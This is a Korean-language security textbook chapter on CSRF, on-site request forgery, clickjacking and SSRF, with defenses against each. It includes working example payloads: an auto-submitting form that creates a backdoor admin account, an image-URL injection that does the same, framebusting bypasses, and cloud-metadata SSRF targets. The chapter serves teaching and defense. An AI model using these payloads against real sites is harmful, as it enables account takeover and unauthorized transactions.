# 33장. 요청 위조와 UI 사기

> **이 장에서 다루는 것**
>
> - 공격자가 코드를 실행하지 못해도 피해자의 브라우저를 시켜 인증된 요청을 보내게 하는 원리
> - 쿠키가 자동으로 첨부된다는 사실이 왜 버그가 아니라 설계의 결과이며 동시에 CSRF의 뿌리인지
> - 온사이트와 크로스 사이트 요청 위조가 어떻게 다르고, 클릭재킹이 왜 토큰 방어까지 뚫는지
> - 각 CSRF 방어가 정확히 무엇을 막고 무엇을 못 막는지 — 토큰, 재인증, Referer 검증, 쿠키 범위 축소
> - 방향이 반대인 SSRF와의 구분, 그리고 GraphQL과 WebSocket에서 같은 실패가 되풀이되는 모습

앞 장에서 크로스 사이트 스크립팅(XSS)은 공격자가 피해자의 브라우저 안에서 **코드를 실행**하는 방법이었다. 스크립트가 실행되면 공격자는 사실상 피해자가 되어 무엇이든 할 수 있다. 그러나 XSS가 봉쇄된 애플리케이션에서도 — 모든 출력이 정확히 인코딩되고, 모든 위험한 싱크가 제거된 곳에서도 — 공격자가 피해자를 움직이는 길은 남는다. 코드를 심지 못하더라도, 피해자의 브라우저가 이미 가진 신뢰를 빌리면 된다.

그 신뢰의 정체는 **쿠키**다. 브라우저는 어떤 요청이 어디서 비롯되었는지 따지지 않고, 대상 도메인에 해당하는 쿠키를 자동으로 첨부한다(→ 20.5). 로그인된 사용자의 브라우저가 공격자 사이트의 지시로 은행에 요청을 보내도, 그 요청에는 은행 세션 쿠키가 얌전히 붙는다. 서버 입장에서 이 요청은 진짜 사용자의 요청과 바이트 하나 다르지 않다. 이것이 **요청 위조(request forgery)** 의 뿌리다. 공격자는 피해자의 세션 토큰을 훔칠 필요조차 없다. 토큰을 몰라도, 브라우저에게 대신 쓰게 만들면 그만이다.

이 장은 그 메커니즘을 세 방향으로 따라간다. 먼저 브라우저가 요청을 대신 보내게 하는 원리(요청 위조), 다음으로 피해자가 보는 화면과 실제로 조작하는 대상을 어긋나게 만드는 원리(UI 사기), 마지막으로 같은 실패가 GraphQL과 WebSocket이라는 새 프로토콜에서 어떻게 재현되는지다. 32장이 동일 출처 정책의 **안쪽**을 공격했다면, 이 장부터는 그 경계선 자체를 둘러싼 싸움으로 들어간다. 경계가 정확히 어떻게 계산되는지는 다음 장에서 해부한다(→ 34.1).

이 장 전체에서 실행 예제로는 온라인 서점을 쓴다. 주소 변경, 주문 취소, 관리자 권한 부여 같은 상태 변경 기능이 어떻게 위조되는지를 하나의 애플리케이션으로 따라가는 편이 낫기 때문이다.

## 33.1 사용자 행위 유도 — 요청 위조의 원리

요청 위조는 **세션 라이딩(session riding)** 이라고도 불린다. 세션 하이재킹과 가까운 친척이지만 결정적 차이가 하나 있다. 하이재킹에서 공격자는 피해자의 세션 토큰을 손에 넣어 그 토큰으로 애플리케이션을 "피해자로서" 사용한다. 요청 위조에서 공격자는 **토큰을 결코 알지 못한다.** 대신 브라우저의 정상 동작을 이용해, 피해자의 토큰이 피해자가 의도하지 않은 요청에 쓰이도록 만든다.

이 공격이 성립하는 이유는 단 하나의 사실에서 나온다.

> **일단 서버가 쿠키를 설정하면, 브라우저는 그 도메인으로 가는 모든 후속 요청에 그 쿠키를 자동으로 첨부한다. 요청이 어디서 비롯되었는지 — 애플리케이션 내부의 링크인지, 폼인지, 외부 사이트인지, 이메일 속 링크인지 — 는 아무 영향을 주지 않는다.**

이 동작은 결함이 아니다. 쿠키의 존재 이유 자체다(→ 20.5). HTTP는 상태가 없고, 쿠키는 그 무상태성 위에 "이 브라우저는 아까 로그인한 그 사용자"라는 연속성을 얹기 위해 만들어졌다. 브라우저가 매 요청마다 쿠키를 다시 붙이지 않는다면 로그인은 한 번의 클릭도 버티지 못한다. 자동 첨부는 쿠키가 제공하기로 약속한 바로 그 편의다. 문제는 그 편의가 **요청의 출처를 구분하지 않는다**는 데 있다. 브라우저는 "이 요청을 누가 시켰는가"를 서버에 알려 주지 않으며, 알려 줄 의무도 없다.

여기에 동일 출처 정책(same-origin policy)의 중요한 비대칭이 겹친다. 동일 출처 정책은 흔히 "다른 사이트가 내 사이트를 건드리지 못하게 막는 것"으로 이해되지만, 그 이해는 절반만 맞다.

> **동일 출처 정책은 한 사이트가 다른 도메인으로 요청을 *보내는 것*을 막지 않는다. 막는 것은 그 요청의 *응답을 읽는 것*뿐이다.**

즉 공격자 사이트는 은행으로 요청을 얼마든지 발송할 수 있다. 다만 그 응답의 내용을 자바스크립트로 읽어 갈 수는 없다. 이 비대칭이 요청 위조의 성격을 규정한다. 공격자는 **쓰기(상태 변경)** 는 유도할 수 있지만 **읽기(데이터 탈취)** 는 원칙적으로 할 수 없다. 그래서 순수한 CSRF는 대개 "단방향(one-way)" 공격이다. 응답에서 값을 읽어 다음 요청에 넣는 다단계 상호작용 — Samy 웜 같은 것 — 은 순수 CSRF만으로는 불가능하다. 이 판정이 정확히 어느 시점에 어떤 값으로 이루어지는지는 34장에서 다룬다(→ 34.1).

공격자가 유도할 수 있는 행위의 범위는 피해자가 가진 권한을 넘지 못한다는 점도 기억할 만하다. 피해자가 하루 100만 원까지만 이체할 수 있다면 위조된 이체도 그 한도 안이다. 요청이 피해자에게 없는 권한을 요구하면 그냥 실패한다. 요청 위조는 권한을 **상승**시키는 도구가 아니라 피해자의 권한을 **빌리는** 도구다. 그렇기에 관리자가 표적일 때 가장 위험하다. 관리자의 브라우저에 위조 요청을 심으면, 그 요청은 관리자의 모든 권한을 업고 실행된다.

행위를 유도하는 방법은 여럿이다. 피해자에게 링크를 클릭하게 하거나(사회공학), 이미지 태그처럼 자동으로 로드되는 요소에 요청을 숨기거나, 폼을 자바스크립트로 자동 제출시킬 수 있다. 공통점은 하나다 — 피해자의 브라우저가 요청을 발송하는 순간, 그 브라우저에 저장된 쿠키가 요청을 정당한 것으로 만든다.

> **이 절이 뒷받침하는 것**
>
> - 쿠키 자동 첨부가 CSRF의 근본 원인이다 → **20.5** (쿠키 동작), **20.8** (관대한 스코프가 첨부 범위를 넓힌다)
> - 동일 출처 정책은 요청 발송이 아니라 응답 읽기만 막는다 → **34.1** (출처 판정 규칙의 해부)
> - 요청 위조는 토큰 탈취 없이 세션을 빌린다 → **23.5** (클라이언트의 토큰 하이재킹 노출과 대조)

## 33.2 온사이트 요청 위조 / 크로스 사이트 요청 위조(CSRF)

요청 위조는 두 갈래로 나뉜다. 위조 요청이 취약한 애플리케이션 **자신의 도메인 안에서** 발생하면 **온사이트 요청 위조(on-site request forgery, OSRF)**, 공격자가 통제하는 **다른 도메인에서** 발생하면 **크로스 사이트 요청 위조(cross-site request forgery, CSRF)** 다.

### 33.2.1 온사이트 요청 위조

OSRF는 저장형 XSS를 익스플로잇하는 익숙한 페이로드로 여겨지지만, **XSS가 불가능한 상황에서도 성립한다**는 점이 자주 간과된다. 이것이 OSRF를 별도로 다뤄야 하는 이유다.

온라인 서점의 서평 게시판을 예로 들자. 사용자가 남긴 서평은 다른 사용자들에게 표시되고, 제출 요청은 다음과 같다.

```
POST /submit-review HTTP/1.1
Host: books.example.com
Content-Length: 42

type=question&name=daf&message=좋은책입니다
```

이 요청은 페이지에 다음과 같은 행을 만든다.

```html
<tr>
  <td><img src="/images/question.gif"></td>
  <td>daf</td>
  <td>좋은 책입니다</td>
</tr>
```

당연히 XSS를 먼저 시험한다. 그런데 애플리케이션이 삽입되는 `"`, `<`, `>` 를 정확히 HTML 인코딩하고 있어 태그를 깨고 나올 방법이 없다고 하자. 여기서 대부분 다음 시험으로 넘어간다. 그러나 다시 보라. 공격자는 `<img>` 태그의 **target(src 값)의 일부를 통제한다.** 따옴표로 둘러싸인 문자열을 탈출하지는 못해도, URL 자체를 바꿔 이 서평을 보는 **모든 사용자가 임의의 온사이트 GET 요청**을 하게 만들 수 있다. `type` 파라미터에 다음 값을 넣으면 된다.

```
../admin/newUser?username=daf2&password=0wned&role=admin#
```

이 서평을 일반 사용자가 열면 요청은 권한 부족으로 실패한다. 그러나 **관리자**가 이 서평을 열면, 관리자의 세션으로 백도어 계정이 생성된다. 자바스크립트가 전혀 실행되지 않았는데도 — 관리자가 스크립트를 꺼 두었더라도 — 공격은 성공한다. 끝의 `#` 은 `.gif` 접미사가 붙기 전에 URL을 잘라 낸다. `&` 를 써서 접미사를 또 하나의 파라미터로 삼켜 버려도 된다.

OSRF의 교훈은 **HTML 인코딩이 방어가 되지 못한다**는 것이다. 브라우저는 요청하기 전에 target URL 문자열을 디코딩하기 때문이다. `&`, `<`, `>` 를 엔티티로 바꿔도 브라우저는 그것을 다시 풀어 실제 요청을 만든다. OSRF를 막으려면 사용자 입력을 응답에 넣기 전에 **가능한 한 엄격하게 검증**해야 한다. 앞의 예라면 `type` 이 미리 정해진 값들 중 하나인지 확인하면 된다. 예측할 수 없는 값을 받아야 한다면 `/ . \ ? & =` 같은 문자를 차단한다.

### 33.2.2 크로스 사이트 요청 위조

CSRF에서 공격자는 무해해 보이는 웹페이지를 만들어, 그 페이지를 방문한 피해자의 브라우저가 취약한 애플리케이션으로 요청을 직접 보내게 한다. 온라인 서점에서 관리자가 새 계정을 만드는 요청이 다음과 같다고 하자.

```
POST /auth/NewUserStep2 HTTP/1.1
Host: books.example.com
Cookie: SessionId=8299BE6B260193DA076383A2385B07B9
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

realname=daf&username=daf&userrole=admin&password=letmein&confirmpassword=letmein
```

이 요청은 CSRF에 취약하게 만드는 **세 가지 특징**을 갖는다.

1. **요청이 권한 있는 행위를 수행한다.** 여기서는 관리자 권한을 가진 새 사용자를 만든다.
2. **애플리케이션이 세션 추적을 오직 쿠키에만 의존한다.** 요청 안 어디에도 세션과 결부된 다른 토큰이 없다.
3. **공격자가 필요한 모든 파라미터를 미리 결정할 수 있다.** 쿠키 속 세션 토큰을 제외하면, 예측 불가능한 값이 요청에 들어가지 않는다.

이 셋이 함께 있으면 공격자는 필요한 모든 값을 담은 크로스 도메인 요청 페이지를 만들 수 있다.

```html
<html>
  <body>
    <form action="https://books.example.com/auth/NewUserStep2" method="POST">
      <input type="hidden" name="realname" value="daf">
      <input type="hidden" name="username" value="daf">
      <input type="hidden" name="userrole" value="admin">
      <input type="hidden" name="password" value="letmein">
      <input type="hidden" name="confirmpassword" value="letmein">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

모든 파라미터는 숨겨진 폼 필드에 들어 있고, 스크립트가 페이지 로드와 동시에 폼을 자동 제출한다. 브라우저가 폼을 제출할 때 대상 도메인의 쿠키를 자동으로 붙이므로, 로그인 상태인 관리자가 이 페이지를 방문하기만 하면 요청은 관리자의 세션에서 처리되고 백도어 계정이 만들어진다. 관리자는 아무 버튼도 누르지 않았다.

이것이 32장의 XSS와 정확히 대비되는 지점이다(→ 32.4). **XSS는 취약한 사이트에 코드를 심어 그 코드가 사이트의 권한으로 실행되게 한다. CSRF는 코드를 심지 않고, 브라우저가 이미 가진 쿠키를 빌려 요청 하나를 대신 보내게 한다.** XSS 페이로드는 응답을 읽고 다음 행동을 이어 갈 수 있지만(양방향), CSRF는 요청만 보낼 뿐 응답을 읽지 못한다(단방향). 그래서 둘은 흔히 한 몸처럼 쓰인다 — XSS의 전달 벡터가 곧 CSRF 요청을 실어 나르는 통로이기도 하다.

**실제 사례.** 2004년 eBay에서 Dave Armstrong이 찾은 결함은 특정 URL을 요청하면 요청한 사용자가 경매 상품에 임의의 입찰을 하게 되는 것이었다. 제3자 사이트가 방문자에게 이 URL을 요청시키면, 그 사이트를 방문한 모든 eBay 사용자가 입찰을 하게 되었다. 나아가 이것은 eBay 내부의 저장형 OSRF로도 확장되었다. 애플리케이션은 경매 설명에 `<img>` 태그를 허용하되 그 대상이 실제 이미지 파일을 반환하는지 검증했다. 그러나 공격자는 상품 등록 시점에는 정상 이미지를 반환하는 외부 서버를 걸어 두고, 나중에 그 이미지를 CSRF URL로의 HTTP 리다이렉트로 바꿔치기했다. 검증한 시점과 사용한 시점 사이에 값이 바뀌는 이 결함을 **TOCTOU(time of check, time of use)** 라 부른다.

**인증 상태와 CSRF.** CSRF는 피해자 세션의 문맥에서 권한 있는 행위를 수행하므로, 보통 공격 시점에 피해자가 로그인되어 있어야 한다. 예외가 있다. 가정용 공유기의 웹 인터페이스처럼 인증이 필요하지만 기본 자격증명을 아무도 바꾸지 않는 장치라면, 공격자 페이지가 먼저 기본 자격증명으로 로그인 요청을 보내 세션 토큰을 심고, 그 다음 인증된 행위를 수행하는 2단계 공격이 가능하다. 또 어떤 경우에는 공격자가 피해자를 **공격자 자신의 계정으로** 로그인시켜야 특정 공격이 성립한다 — 피해자가 올린 파일만 그가 다시 내려받을 수 있는 기능에 저장형 XSS가 있을 때, 공격자는 CSRF로 피해자를 공격자 계정에 로그인시킨 뒤 악성 파일을 내려받게 하여 그 XSS를 발화시킬 수 있다.

한 가지 더. **CSRF는 다른 취약점의 영향도를 바꾼다.** 예컨대 관리자 전용 조회 기능에 SQL 인젝션이 있다고 하자. 관리자는 어차피 DB 전권을 가지므로 낮은 위험으로 보일 수 있다. 그러나 그 기능이 "관리 행위"를 하지 않는다는 이유로 CSRF 방어가 걸려 있지 않다면, 공격자는 CSRF를 통해 비관리 사용자에게도 그 SQL 인젝션을 실행시킬 수 있다. 요청 위조는 다른 취약점을 익스플로잇하는 추가 벡터를 제공한다.

## 33.3 UI 리드레스(클릭재킹)와 프레임 방어

토큰 기반 CSRF 방어의 목표는 "요청이 사용자 자신의 행위에서 비롯되었고 제3자 도메인이 유도한 것이 아님"을 보장하는 데 있다(→ 33.4). **UI 리드레스(UI redress)** 공격은 이 보장을 정면으로 우회한다. 왜냐하면 이 공격이 만들어 내는 요청은, 정확히 말해 **실제로 표적 애플리케이션 안에서 비롯되기** 때문이다. 이 계열은 흔히 **클릭재킹(clickjacking)**, 스트로크재킹 같은 이름으로도 불린다.

기본형은 이렇다. 공격자 페이지가 표적 애플리케이션을 **iframe으로 불러온** 뒤, 그 위에 공격자가 만든 다른 인터페이스를 겹쳐 놓는다. 공격자의 인터페이스는 사용자를 유혹해 특정 위치를 클릭하게 만든다. 사용자는 공격자 화면의 버튼을 누른다고 믿지만, 실제로는 그 아래 투명하게 겹쳐진 표적 애플리케이션의 UI를 조작한다.

*그림 33-1. 클릭재킹의 층위 구조*

```
   사용자가 보는 것              실제로 클릭되는 것
  ┌───────────────────┐        ┌───────────────────┐
  │  🎁 경품을 받으려면  │        │  이체 확인          │
  │                   │        │  보내는 계좌: 입출금 │
  │   [ 여기 클릭 ]    │  ◀━━▶  │  받는 계좌: 08167175 │
  │                   │        │  금액: 5,000,000원  │
  │  (공격자 오버레이)  │        │   [확인]  [취소]     │
  └───────────────────┘        └───────────────────┘
   불투명한 위층                 투명한 iframe (아래층)
```

온라인 서점의 결제 이체가 2단계라고 하자. 1단계에서 사용자가 이체 정보를 제출하면, 응답은 그 내용과 함께 **확인 버튼**, 그리고 CSRF 방어용 **예측 불가능한 토큰**을 숨긴 필드로 담은 폼을 보여 준다. 이 토큰은 확인 버튼을 누를 때 제출되고, 서버는 값을 검증한 뒤에야 이체한다.

클릭재킹은 이렇게 작동한다. 공격자 페이지는 1단계 요청을 iframe 안에서 통상적 CSRF로 보낸다. 애플리케이션은 평소처럼 상세 내용과 확인 버튼이 담긴 응답을 돌려주고, 이 응답은 공격자의 iframe 안에 "표시"된다. 그 위에 공격자의 유혹 인터페이스가 겹쳐, 사용자가 확인 버튼 영역을 클릭하도록 유도한다. 사용자가 그 영역을 클릭하면 실제로는 표적의 확인 버튼을 누르는 것이고, 이체가 완료된다.

이 공격이 순수 CSRF가 실패하는 곳에서 성공하는 이유가 핵심이다. **애플리케이션의 CSRF 토큰은 정상적으로 처리된다.** 공격자 페이지는 동일 출처 정책 때문에 그 토큰 값을 읽지 못하지만, iframe 안의 폼에는 애플리케이션이 생성한 토큰이 이미 들어 있고, 사용자가 무심코 확인 버튼을 누르면 그 토큰이 그대로 애플리케이션에 제출된다. 애플리케이션이 보기에 모든 것이 정상이다. 토큰은 "요청이 이 페이지 안에서 비롯되었는가"를 보장할 뿐인데, 클릭재킹에서는 요청이 실제로 그 페이지 안에서 비롯되기 때문이다.

투명하게 겹치는 트릭은 CSS로 구현한다. iframe을 임의 크기·임의 위치로 두고, 표적 페이지의 임의 지점을 보이게 하며, `opacity` 속성으로 완전히 투명하게 만들 수 있다. 더 정교한 변형에서는 스크립트로 키 입력을 선별해 표적 입력란을 채우거나, 드래그 동작을 가로채 표적 애플리케이션의 텍스트(이메일 본문, URL에 담긴 CSRF 토큰 등)를 공격자 입력란으로 끌어오게 만들 수도 있다.

여기서 클릭재킹이 **26장의 클라이언트 사이드 통제 우회와 다른 층위**임을 분명히 해 둘 필요가 있다(→ 26.3). 26장의 우회는 클라이언트가 서버로 보내는 데이터 자체를 조작한다 — 히든 필드를 바꾸고, 자바스크립트 검증을 건너뛰고, 비활성 요소를 되살린다. 공격의 주체는 **공격자 자신**이며, 자신의 브라우저에서 자신의 요청을 손본다. 클릭재킹은 다르다. 요청을 손대는 것이 아니라, **정당한 사용자가 정당한 UI를 조작하게 만들되 그 인지를 속인다.** 데이터는 조작되지 않는다. 조작되는 것은 사용자가 무엇을 클릭하는지에 대한 **인식**이다. 그래서 서버 측 검증으로는 잡을 수 없다 — 서버에 도착한 요청은 진짜 사용자가 진짜로 만든 요청이기 때문이다.

**프레임버스팅과 그 실패.** UI 리드레스가 널리 알려지자 많은 사이트가 **프레임버스팅(framebusting)** 으로 방어하려 했다. 각 페이지가 자신이 iframe 안에 로드되었는지 검사하고, 그렇다면 프레임을 "부수고" 최상위로 빠져나가는 스크립트를 실행하는 방식이다.

```html
<script>
  if (top.location != self.location) { top.location = self.location; }
</script>
```

2010년 스탠퍼드 대학의 조사는 상위 500개 사이트의 프레임버스팅을 전수 검토했고, **모든 경우가 어떤 식으로든 우회 가능**하다는 결론을 냈다. 우회 방법은 방어의 세부에 따라 다르지만 대표적으로 다음이 있다.

- 공격자 페이지가 최상위 프레임을 통제하므로 `top.location` 의 의미를 재정의해, 자식 프레임이 그것을 참조할 때 예외가 나게 만든다.
- 최상위 프레임이 `window.onbeforeunload` 이벤트를 후킹해, 프레임버스팅 코드가 최상위 위치를 바꾸려 할 때 HTTP 204(No Content)를 반환하는 URL로 리다이렉트를 걸어 이동을 취소시킨다.
- 표적을 자식 프레임에 로드할 때 `sandbox` 속성을 지정해 자식 프레임의 스크립트를 비활성화하되 쿠키는 살려 둔다. 스크립트가 죽으면 프레임버스팅 코드도 실행되지 않는다.

프레임버스팅은 스크립트로 하는 방어이고, 공격자 역시 스크립트로 그 환경을 통제하므로 근본적으로 취약하다. 현재의 합의는 **프레임버스팅을 확실한 방어로 신뢰해서는 안 된다**는 것이다. 프레임 자체를 브라우저 수준에서 거부하는 응답 헤더 방식이 더 견고하지만, 그 헤더의 세부는 이 책의 범위를 넘어선다(→ 33.4 말미 상자).

한 가지 실무적 함정. 안티프레이밍 방어를 검토할 때는 **모바일용으로 별도 제공되는 인터페이스**를 반드시 함께 본다. `books.example.com/chat/` 은 견고하게 프레이밍을 막아도 `books.example.com/mobile/chat/` 에는 아무 방어가 없을 수 있다. 모바일 버전이 일반 브라우저에서도 정상 동작하고 세션이 두 버전 간에 공유된다면, 방어의 구멍이 그대로 노출된다.

## 33.4 CSRF 방어 — 토큰, 재인증, Referer 검증, 쿠키 범위 축소

CSRF는 브라우저가 쿠키를 매 요청에 자동으로 되돌려 보내기 때문에 생긴다. 애플리케이션이 세션 추적을 **오직 쿠키에만** 의존하면 이 공격에 본질적으로 노출된다. 따라서 방어의 방향은 하나로 모인다 — 쿠키만으로는 부족하게 만들고, 요청이 정말 애플리케이션 내부에서 비롯되었다는 추가 증거를 요구하는 것이다. 아래 네 방어는 각각 무엇을 막고 무엇을 못 막는지가 다르다.

**표 33-1. CSRF 방어별 차단 범위와 한계**

| 방어 | 무엇을 막는가 | 무엇을 못 막는가 |
|---|---|---|
| 안티 CSRF 토큰 | 크로스 도메인 요청 (공격자가 토큰을 모름) | 저장형 XSS, 클릭재킹, 토큰이 세션에 결속되지 않은 경우 |
| 재인증·트랜잭션 서명 | 자동 제출되는 위조 요청 | 사용자가 스스로 자격증명을 입력하도록 유도되는 경우 |
| Referer 검증 | 헤더가 존재하고 정확할 때의 크로스 사이트 요청 | 헤더 누락·위조 시 (판정 기준으로 삼기 부적절) |
| 쿠키 범위 축소 | 무관한 하위 도메인·경로로의 쿠키 노출 확대 | CSRF 자체 (정확한 대상 도메인으로는 여전히 첨부됨) |

### 33.4.1 안티 CSRF 토큰

표준 방어는 쿠키에 더해 **추가 토큰**으로 세션을 추적하는 것이다. 보통 HTML 폼의 숨겨진 필드로 전송되며, 서버는 매 요청에서 세션 쿠키를 검증하는 것에 더해 올바른 토큰이 함께 왔는지 확인한다. 공격자가 그 값을 알 수 없다면, 성공하는 크로스 도메인 요청을 만들 수 없다. 토큰은 요청 헤더(`X-CSRF-TOKEN`)나 본문 파라미터(`csrf-token`)로 실려 온다.

토큰이 방어가 되려면 **일반 세션 토큰과 똑같은 안전장치**를 지켜야 한다. 이 요구사항은 23.2의 토큰 생성 약점과 정확히 같다(→ 23.2). 즉 **예측 불가능성**이 핵심이다.

- **예측 불가능해야 한다.** 공격자가 다른 사용자에게 발급될 토큰 값을 예측할 수 있다면, 필요한 모든 파라미터를 알아내 공격을 완성할 수 있다. 짧거나, 규칙적 패턴을 갖거나, 약한 알고리즘으로 생성된 토큰은 무차별 대입될 수 있다.
- **세션에 결속되어야 한다.** 토큰이 발급받은 사용자의 세션에 묶여 있지 않으면, 공격자가 자기 세션에서 유효한 토큰을 얻어 다른 사용자를 겨냥한 CSRF에 재사용할 수 있다.
- **한 번 무효화된 토큰은 다시 받지 않아야 한다.** 요청마다 새 토큰을 발급하는 편이 세션 생애 동안 하나를 재사용하는 것보다 강하다 — 공격자가 유효 토큰을 확보할 시간 창이 줄기 때문이다.

토큰을 우회하려는 흔한 시도들은 대부분 구현 결함을 노린다. 토큰 값만 비우기(파라미터는 있지만 null), 파라미터 자체를 통째로 제거하기, 이미 쓴 토큰을 재사용하기, 같은 길이의 무작위 문자열로 바꾸기(서버가 길이만 보는 경우), 약한 토큰을 무차별 대입하기 등이다. 견고한 구현은 이 모두를 거부한다.

토큰의 함정도 있다. **다단계 프로세스는 그 자체로 방어가 되지 못한다.** 계정 생성을 "입력 → 확인" 2단계로 나눠도, 추가 토큰이 없으면 공격자는 두 요청을 순서대로 보내거나 곧장 두 번째 요청으로 진행하면 그만이다. 또 한 응답에서 설정되고 다음 요청에서 제출되는 토큰이라도, 두 단계 사이가 **리다이렉션**으로 이어지면 방어는 무의미해진다. CSRF는 응답을 읽지 못하지만, CSRF 응답이 토큰을 담은 URL로의 리다이렉트를 포함하면 피해자의 브라우저가 그 리다이렉트를 자동으로 따라가며 토큰을 자동으로 제출하기 때문이다.

**XSS와의 관계.** "XSS가 하나라도 있으면 CSRF 방어는 무력하다"는 주장은 절반만 맞다. XSS 페이로드는 온사이트에서 실행되므로 응답에서 토큰을 읽어 다음 요청에 넣을 수 있다 — 이 부분은 옳다. 그러나 방어된 페이지에 **반사형** XSS가 있다면, 반사형 공격의 최초 요청 자체가 크로스 사이트이므로 그 요청에 이미 유효 토큰이 담겨 있어야 한다. 토큰이 없으면 요청이 거부되고, XSS를 담은 코드 경로가 아예 실행되지 않는다. 반면 **저장형** XSS는 방어된 기능 안에 있으면 언제나 방어를 뚫는다 — 저장된 스크립트가 자신이 포함된 바로 그 응답 속 토큰을 직접 읽기 때문이다. 방어가 일부 기능에만 걸려 있어 방어되지 않은 기능의 반사형 XSS로 토큰을 얻는 경로도 있다. 결론은 단순하다. CSRF 방어가 일부 반사형 XSS를 어렵게 만들기는 해도, **XSS는 그 자체로 반드시 고쳐야 한다.**

### 33.4.2 재인증과 Referer 검증

**재인증(re-authentication)** 과 **트랜잭션 서명(transaction signing)** 은 민감한 행위 직전에 사용자에게 비밀번호를 다시 입력시키거나 별도 채널의 확인을 요구한다. 공격자는 피해자의 비밀번호를 모르므로 자동 제출로는 이 관문을 통과할 수 없다. 다만 사용자를 속여 스스로 자격증명을 입력하게 만드는 경로(클릭재킹의 키 입력 유도 등)까지 막지는 못한다.

**Referer 검증**은 요청이 온사이트에서 왔는지 오프사이트에서 왔는지를 `Referer` 헤더로 판단하려는 시도다. 겉보기에 그럴듯하지만 **방어의 토대로 삼아서는 안 된다.** 이유는 8.6에서 정리한 헤더 신뢰성 문제 그대로다(→ 8.6). Referer는 **클라이언트가 넣는 값**이다. 서버가 생성하지 않는다. 구식 Flash로 위조되거나 meta refresh 태그로 가려질 수 있고, 프라이버시 설정·프록시·HTTPS→HTTP 전환에서 **아예 누락**된다. 여기서 설계 딜레마가 생긴다 — Referer가 없을 때 요청을 거부하면 정당한 사용자가 막히고, 통과시키면 공격자가 헤더를 지워 우회한다. 어느 쪽이든 견고하지 않다. Referer 검증은 보조적 신호로는 쓸 수 있어도, 그것만으로 요청의 정당성을 판정해서는 안 된다.

### 33.4.3 쿠키 범위 축소

마지막 방어는 CSRF를 직접 막는 것이 아니라 **노출 표면을 줄이는** 것이다(→ 20.8). 쿠키의 `domain`, `path` 속성을 필요 이상으로 넓게 잡으면(→ 20.6), 그 쿠키는 무관한 하위 도메인과 경로로 가는 요청에까지 첨부된다. 예컨대 `Domain=example.com` 으로 설정된 세션 쿠키는 취약할 수 있는 `blog.example.com`, `legacy.example.com` 같은 형제 하위 도메인으로도 첨부되어, 그중 한 곳의 결함이 세션 쿠키를 위조 요청에 실어 나르는 통로가 된다. 쿠키를 꼭 필요한 도메인·경로로 좁히면 이런 확대를 막는다.

그러나 범위 축소가 **CSRF 자체를 막지는 못한다.** 쿠키를 정확한 대상 도메인으로 좁혀도, 그 대상 도메인으로 가는 위조 요청에는 여전히 쿠키가 첨부되기 때문이다. 이것은 CSRF의 근본 원인 — 자동 첨부 — 을 없애는 것이 아니라, 그 첨부가 미치는 범위를 관리하는 심층 방어일 뿐이다. 근본 방어는 여전히 토큰이다.

> **이 절이 뒷받침하는 것**
>
> - 안티 CSRF 토큰의 예측 불가능성 요구 → **23.2** (토큰 생성의 약점 — 같은 요구사항)
> - Referer가 판정 기준이 될 수 없는 이유 → **8.6** (Referer는 클라이언트가 넣고 누락될 수 있다)
> - 쿠키 범위 축소가 노출을 줄이는 원리 → **20.6**, **20.8** (쿠키 속성과 관대한 스코프의 문제)

> **이 책의 범위를 넘어서**
>
> 오늘날 CSRF 방어의 상당 부분은 브라우저 수준으로 옮겨 갔다. 쿠키를 크로스 사이트 요청에 첨부할지 결정하는 `SameSite` 쿠키 속성, 요청의 출처 맥락을 서버에 알려 주는 Fetch Metadata 헤더, 프레이밍을 세밀하게 통제하는 CSP `frame-ancestors` 지시자와 현대적 프레임 방어 헤더가 그것이다. 이들은 자동 첨부와 프레이밍이라는 근본 원인을 브라우저가 직접 다루게 하여, 애플리케이션 코드의 부담을 크게 줄인다. 다만 이 표준들은 이 책이 다루는 다섯 권의 원서 범위 밖이므로 세부는 생략한다. 원리만 기억하면 충분하다 — 이 장이 설명한 취약점의 뿌리(쿠키 자동 첨부, 프레임 중첩)를 브라우저가 선언적으로 제어하도록 넘긴 것이 이 방어들의 공통된 발상이다.

## 33.5 서버 측 요청 위조(SSRF)와의 구분

이름이 비슷해 혼동되지만, **서버 측 요청 위조(server-side request forgery, SSRF)** 는 CSRF와 방향이 정반대다. 이 구분을 한 문장으로 못 박아 두는 것이 이 절의 목적이다.

> **CSRF는 공격자가 *클라이언트(피해자의 브라우저)* 를 시켜 서버에 요청을 보내게 한다. SSRF는 공격자가 *서버* 를 시켜 다른 곳에 요청을 보내게 한다.**

*그림 33-2. 두 요청 위조의 방향*

```
  CSRF:   공격자 ─유도─▶ 피해자 브라우저 ─(쿠키 첨부)─▶ 표적 서버
                        (피해자의 신뢰를 빌린다)

  SSRF:   공격자 ─URL 주입─▶ 표적 서버 ─(내부망 접근)─▶ 내부 서비스
                                       (서버의 신뢰를 빌린다)
```

SSRF는 애플리케이션이 클라이언트가 준 입력으로 **아웃바운드 요청**을 수행할 때 생긴다. 온라인 서점이 "이미지 URL을 주면 그 이미지를 가져와 상품에 붙여 준다"는 기능을 제공한다고 하자. 정상 사용에서는 사용자가 `imgur.com` 의 이미지 URL을 준다. 그러나 공격자가 `http://169.254.169.254/...` 같은 내부 주소나 `http://10.10.0.254/index.html` 같은 사설 IP를 주면, 서버가 그 주소로 요청을 보낸다. 서버는 내부망에 있으므로, 클라이언트가 직접 닿을 수 없는 내부 API·데이터베이스·클라우드 메타데이터 엔드포인트에 접근하게 된다. 공격자는 그 응답을 통해 도달할 수 없어야 할 자원을 읽는다.

SSRF의 익스플로잇 양상은 응답이 얼마나 돌아오느냐로 나뉜다. **블라인드 SSRF** 는 시각적 확인 없이 아웃오브밴드 도구나 타이밍 분석으로만 존재를 추론한다. **세미 블라인드** 는 오류나 부분 응답 같은 단서를 준다. **논블라인드(full-read)** 는 서버가 전체 응답을 그대로 돌려준다. 열린 포트를 탐색하는 변형은 **크로스 사이트 포트 어택(XSPA)** 이라 불리며 SSRF 범주에 든다.

